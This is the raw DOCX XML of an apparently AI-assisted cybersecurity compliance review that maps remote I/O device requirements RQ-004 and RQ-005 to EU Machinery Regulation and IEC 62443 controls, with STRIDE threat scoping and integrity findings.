            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7C433FC4" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Data identification now rests solely on the I&amp;M4 fingerprint (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Par_CRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), reframed as </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identification-by-fingerprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (not content-level classification) — G-1 corrected without importing modification-evidence. </w:t>
      </w:r>
      <w:hyperlink r:id="rId107" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3AF24063" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr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Demoted CR 3.4 / Spoofing / MITM identity-falsification — </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>protecting</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the identification against corruption is RQ-005. Removed the primary CR 3.4 mapping, the Spoofing primary threat, Asset F as primary, and TC-RQ004-04 (MITM); these are now cross-referenced to RQ-005.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9CDC05" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE simplified to Information Disclosure (primary) — the correct always-present threat for an identification requirement; tampering/spoofing of identity cross-referenced out.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB1A5A6" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Retained the two genuine RQ-004 limbs and their strongest findings: G-2 (SBOM completeness — CR 7.8) and G-3 (confidentiality — CR 4.1/4.3), both in scope. </w:t>
      </w:r>
      <w:hyperlink r:id="rId108" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId109" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="302CB8A2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 xml:space="preserve">The corrected verdict is tighter and non-overlapping: RQ-004 = identify (completeness, incl. SBOM gap) + keep that identification confidential — with </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity/protection of the identification</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cleanly deferred to RQ-005, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>change-tracking</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> deferred to RQ-009.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB3E4E9" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9" w:rsidP="00E404B9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Would you like me to (a) apply the same scope-recheck to RQ-006 (it reused the identity-integrity/MITM material and should be realigned the same way), (b) re-</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">check RQ-005 to confirm it now correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the identification-integrity concern, or (c) proceed to consolidation?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3753109F" w14:textId="77777777" w:rsidR="00A16302" w:rsidRDefault="00A16302" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BA2C7FD" w14:textId="661B6E87" w:rsidR="0043237E" w:rsidRPr="00C1714F" w:rsidRDefault="0043237E" w:rsidP="0043237E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t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0C8DA5" w14:textId="77777777" w:rsidR="0043237E" w:rsidRPr="00B84B53" w:rsidRDefault="0043237E" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8DAB75" w14:textId="77777777" w:rsidR="00B84B53" w:rsidRPr="00B84B53" w:rsidRDefault="00B84B53" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EB8833A" w14:textId="77777777" w:rsidR="00B84B53" w:rsidRPr="00B84B53" w:rsidRDefault="00B84B53" w:rsidP="00B84B53">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B84B53">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D66AF5B" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476222C8" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Rechecking RQ-005 against the same scope-boundary discipline, I found the mirror-image error to RQ-004. RQ-004 correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hands</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the identification-integrity concern </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-005; but in doing so I must also make sure RQ-005 does not itself </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>reach into RQ-011's territory (authorization / access control)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve">On review, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>my</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve"> original RQ-005 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>did</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>exactly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>that</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADD1BA4" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">I added an </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Elevation-of-Privilege threat</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>analysed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>physical update gate (rotary switch = 999 + Update state)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as an RQ-005 mitigation, and wrote </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ005-05 (Firmware-Update Access-Control Gate)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>That is authorization — "who is allowed to update" — which is the substance of RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("prevent modifications… where such modifications could lead to a hazardous situation"). It has been </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>removed from RQ-005 and returned to RQ-011.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7A12E9" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Asset G (operating-mode/switch)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> was likewise imported as the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access-control</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> trigger → demoted to a cross-reference (its security-relevant analysis is authorization = RQ-011).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79342E30" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">RQ-005 is a pure </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity / authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>is the identified software and data protected against corruption (accidental or intentional)?</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>who is authorized to change it</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. The corrected analysis keeps the integrity core (CRC-for-data, secure-boot/update-signature-for-firmware) and cleanly excludes the authorization material.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DCD475" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="398997AB">
          <v:rect id="_x0000_i1285" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCF716E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043F7C81" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129817F0" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §1</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, applied to the </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identified</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> assets from RQ-004. Pure </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>integrity / authenticity</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement across two limbs: </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part B (data/config at rest)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Part D (firmware image / boot)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D04F61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722"/>
        <w:gridCol w:w="1263"/>
        <w:gridCol w:w="4383"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="2EABA2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DB1911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CR / EDR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5D9AEF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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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0DA31B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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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372C4F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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Correction</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="41AAA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70C5D" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>CR 3.4 – Software &amp; Information Integrity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1F539" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F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95057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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> — Part 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C0222" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Keep.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="46B9C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B6640" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EDR 3.14 – Integrity of boot process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E7101" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F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1FF58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t>Correct</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> — Part 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D8D7C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Keep — </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>unmet</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (bootloaders report versions but no boot-image signature verification is documented).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="25FA5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E281A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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
